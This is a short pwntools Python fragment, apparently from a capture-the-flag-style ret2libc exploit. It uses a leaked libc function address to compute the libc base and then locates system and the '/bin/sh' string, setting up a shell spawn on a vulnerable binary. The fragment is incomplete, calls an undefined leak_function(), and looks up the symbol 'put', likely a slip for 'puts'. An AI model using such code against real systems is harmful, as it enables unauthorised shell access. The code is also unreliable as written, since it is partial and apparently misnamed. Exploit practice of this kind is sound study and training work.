from pwn import *

libc = ELF('libc.so')

LEAKED_PUT_ADDR = leak_function()
LIBC_BASE = LEAKED_PUT_ADDR - libc.symbols['put']

SYSTEM_OFF = libc.symbols['system']
LIBC_SYSTEM = LIBC_BASE + SYSTEM_OFF

sh = LIBC_BASE + next(libc.search('sh\x00'))
binsh = LIBC_BASE + next(libc.search('/bin/sh\x00'))

